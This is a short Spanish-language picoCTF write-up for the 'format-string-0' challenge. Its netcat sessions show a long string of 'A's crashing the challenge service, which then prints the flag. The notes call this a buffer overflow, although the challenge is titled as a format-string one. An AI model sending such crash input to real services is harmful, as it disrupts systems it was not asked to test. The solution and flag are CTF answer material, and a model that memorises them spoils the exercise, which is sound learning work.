## Objetivo 
Can you use your knowledge of format strings to make the customers happy?Download the binary [here](https://artifacts.picoctf.net/c_mimas/69/format-string-0).Download the source [here](https://artifacts.picoctf.net/c_mimas/69/format-string-0.c).Connect with the challenge instance here:`nc mimas.picoctf.net 63903`
## Solución
```bash
luispuentes-picoctf@webshell:~$ ls
Parcial1  README.txt  a.out  format-string-0  format-string-0.c
luispuentes-picoctf@webshell:~$ ./a.out
Please create 'flag.txt' in this directory with your own debugging flag.
luispuentes-picoctf@webshell:~$ nc mimas.picoctf.net 56591
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 1
There is no such burger yet!

luispuentes-picoctf@webshell:~$ nc mimas.picoctf.net 56591
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 2
There is no such burger yet!


luispuentes-picoctf@webshell:~$ nc mimas.picoctf.net 56591 
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 3
There is no such burger yet!
        
luispuentes-picoctf@webshell:~$ nc mimas.picoctf.net 56591
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

## Notas
Al pasarle la entrada de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
se desborda el buffer, dando la bandera.

## Referencias
https://www.cloudflare.com/es-es/learning/security/threats/buffer-overflow/